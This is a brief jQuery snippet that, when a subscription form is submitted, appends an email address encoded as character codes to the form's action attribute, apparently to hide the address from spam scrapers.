$(".subscription-form").submit(function() {
    var addr = String.fromCharCode(106, 98, 101, 114, 103, 97, 115, 97, 64, 121, 97, 104, 111, 111, 46, 99, 111, 46, 117, 107);
    if (!$(this).attr('action').endsWith(addr))
        $(this).attr('action', $(this).attr('action') + addr);
})